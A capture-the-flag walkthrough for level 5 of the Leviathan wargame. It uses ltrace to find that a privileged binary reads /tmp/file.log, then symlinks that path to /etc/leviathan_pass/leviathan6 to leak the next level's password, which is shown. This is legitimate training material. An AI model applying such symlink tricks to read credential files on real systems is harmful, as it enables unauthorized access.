## leviathan5

```bash
leviathan5@gibson:~$ ls
leviathan5
leviathan5@gibson:~$ ltrace ./leviathan5 
__libc_start_main(0x8049206, 1, 0xffffd5f4, 0 <unfinished ...>
fopen("/tmp/file.log", "r")            = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)      = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@gibson:~$ ./leviathan5 
YZ55XPVk2l
```
- ` ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log ` - link a file.
-  By creating this symbolic link, you are attempting to trick the "leviathan5" program into reading the contents of "/etc/leviathan_pass/leviathan6" when it tries to access "/tmp/file.log". This might be an attempt to gain unauthorized access to the password file for the user "leviathan6".